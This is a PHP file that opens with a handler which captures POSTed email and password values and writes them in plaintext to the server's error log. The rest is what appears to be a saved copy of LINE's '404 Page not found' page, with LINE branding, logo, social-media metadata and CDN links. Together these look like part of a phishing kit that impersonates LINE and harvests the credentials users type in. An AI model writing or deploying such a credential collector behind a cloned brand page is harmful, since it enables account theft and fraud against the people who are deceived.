<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';

    // Log credentials to the error log
    error_log("LOGIN ATTEMPT: Email: $email | Password: $password");
}
?>

<!DOCTYPE html>
<html dir="ltr" prefix="fb: https://www.facebook.com/2008/fbml" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<title>Page not found | LINE</title>
<meta http-equiv="X-UA-Compatible" content="IE=10">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1">
<meta name="format-detection" content="telephone=no">
<meta name="description" content="description">
<meta name="keywords" content="keywords">


<!--[OGP] -->
<meta property="og:title" content="Page not found | LINE">
<meta property="og:description" content="Page not found.">
<meta property="og:image" content="https://d.line-scdn.net/n/line_lp/img/ogp.png">
<meta property="og:url" content="https://line.me/en/">
<meta property="og:type" content="article">
<meta property="og:site_name" content="LINE">
<meta property="fb:app_id" content="136895609724349">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@LINEjp_official">
<link rel="shortcut icon" type="image/x-icon" href="https://d.line-scdn.net/n/line_lp/img/favicon.ico">

<script src="Page%20not%20found%20_%20LINE_files/html5_1392629137.js"></script>
<link href="Page%20not%20found%20_%20LINE_files/css.css" rel="stylesheet" type="text/css">

<style type="text/css">
@charset "UTF-8";html,body,div,span,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,abbr,address,cite,code,del,dfn,em,img,ins,kbd,q,samp,small,strong,sub,sup,var,b,i,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,textarea,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,figcaption,figure,footer,header,hgroup,menu,nav,section,summary,time,mark,audio,video{margin:0;padding:0;font-size:100%}html{overflow-y:scroll}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}b,strong{font-weight:bold}nav,ol,ul{list-style:none}img{border:0;vertical-align:top}table{border-collapse:collapse;border-spacing:0}input,button,textarea{color:#444;line-height:1.231;font-family:'Meiryo', sans-serif;font-family:'MS PGothic', arial, sans-serif\0/;font-size:13px;-webkit-text-size-adjust:none}select,input,button{font-size:100%;margin:0;vertical-align:baseline}button,input{line-height:normal}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}textarea{overflow-x:hidden;overflow-y:auto;vertical-align:top}:focus{outline:0}h1,h2,h3,h4,h5,h6{font-weight:normal}em,cite{font-style:normal}table,th,td{border:none}fieldset{border:none}fieldset legend{position:absolute;left:-9999px;width:0;height:0;overflow:hidden;margin:0;padding:0}hr{display:none}input,button,textarea{border:0}body{color:#444;line-height:1.231;font-family:'Meiryo', sans-serif;font-family:'MS PGothic', arial, sans-serif\0/;font-size:13px;-webkit-text-size-adjust:none;font-family:arial,sans-serif}a:link,a:visited{color:#00e;text-decoration:underline}a:hover,a:active,a:focus{color:#00e;text-decoration:none}.MdGHD03Select{font-family:"Roboto",sans-serif;font-weight:300}.MdCF:after{content:"";display:block;clear:both}.MdHide{position:absolute;left:-9999px}.MdNonDisp{display:none !important}.MdFontB{font-weight:bold !important}.MdFontN{font-weight:normal !important}.MdLink01,.MdLink01:link,.MdLink01:visited,.MdLink01:hover,.MdLink01:active,.MdLink01:focus{text-decoration:underline !important}.MdLink02,.MdLink02:link,.MdLink02:visited,.MdLink02:hover,.MdLink02:active,.MdLink02:focus{text-decoration:none !important}.MdLink03,.MdLink03:link,.MdLink03:visited{text-decoration:underline !important}.MdLink03:hover,.MdLink03:active,.MdLink03:focus{text-decoration:none !important}.MdLink04,.MdLink04:link,.MdLink04:visited{text-decoration:none !important}.MdLink04:hover,.MdLink04:active,.MdLink04:focus{text-decoration:underline !important}.MdGHD01Head{height:43px;border-bottom:3px solid #3b3b3b}.MdGHD01Head .mdGHD01Wrap{margin:0 auto;width:960px}.MdGHD01Head h1 a{margin:23px 0 0 15px;text-indent:-9999px;display:block;width:58px;height:20px;background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADoAAAAUCAMAAADrw95cAAAAWlBMVEUdzQCi65ad6pFg3Etn3lMp0A6F5HX///8r0BCJ5Xp04GK68bHJ9MJ+424hzgTa99Xx/PCx7qeN5n5Y2kOq7Z8u0RNt31o71CLF8r7U9s+V6IhI1zHo+uT7/vqcuBlOAAAA/ElEQVQ4y5WU23KDMAxENw5hTcPNXEOS/v9vVuAEM0Q17XkxDzrWjNAarrftkytVYW1Sy4ecBV/UibXNfLZ2pXcoASRBbSBkpIPwdjsIuVyHgIgXAOegphCGd1XHBQPBkS22LGqyU7/IzN88BfVKnrGhiasY6w+1OM2YnAcq2g+1oudQRbpXpz+rcDvV5DO3KqqWFz8qfUwm2jVdakd2moqoeqp7CEP2fzXjDTO9opbmQOUdHnVMcZVDULWfM0RUPuDRV+Lhd6t7amolFb8tYmCsFJVXQF//EhsGmjV0Ia93qKELqm83vbp1m7gy0aPuervS1tJCeWC+1QfmB0usFgYOFk7DAAAAAElFTkSuQmCC") 0 0 no-repeat}.MdError{text-align:center;margin-top:246px}.MdError .mdErrorTxt01{font-size:50px;color:#444;font-weight:300}.MdError .mdErrorTxt02{margin-top:7px;font-size:14px;color:#999}.MdError .mdErrorLink{margin-top:26px}.MdError .mdErrorLink a{margin:0 11px;color:#999;font-size:14px;text-decoration:underline;cursor:pointer}body.ExDeviceSP .mdGHD01Wrap{width:100%}body.ExDeviceSP .MdError{margin-top:123px}body.ExDeviceSP .MdError .mdErrorTxt01{font-size:25px}body.ExDeviceSP .MdError .mdErrorTxt02{font-size:11px}body.ExDeviceSP .MdError .mdErrorLink{margin-top:26px}body.ExDeviceSP .MdError .mdErrorLink a{margin:0 11px;font-size:11px}body{font-family:"Roboto",sans-serif}
</style>
</head>
<body class="ExDevicePC">
<div class="LyWrap">

<!--HEADER-AREA-->
<header class="LyHead" role="banner">
<div class="MdGHD01Head">
<div class="mdGHD01Wrap">
<h1><a href="https://www.line.me/">LINE</a></h1>
<!--/mdGHD01Wrap--></div>
<!--/MdGHD01Head--></div>
<!--/LyHead--></header>
<!--/HEADER-AREA-->

<!--CONTENTS-AREA-->
<div class="LyContents" role="main">
<div class="MdError">
<p class="mdErrorTxt01">404. Page not found</p>
<p class="mdErrorTxt02">The page either does not exist, or you have no network connection.</p>
<p class="mdErrorLink"><a href="https://www.line.me/">Home</a><a onclick="history.back();">Back</a></p>
</div>
<!--/LyContents--></div>
<!--/CONTENTS-AREA-->


<!--/LyWrap--></div>

<!--SCRIPT-->
<script>
<!--
    var ua = navigator.userAgent;
    if( /iPhone/.test(ua) || /Android/.test(ua) || /BlackBerry/.test(ua) || /Nokia/.test(ua) || /Windows Phone/.test(ua) ){
        var el = document.body;
        el.className = "ExDeviceSP";
    }
-->
</script>
<!--/SCRIPT-->


</body></html>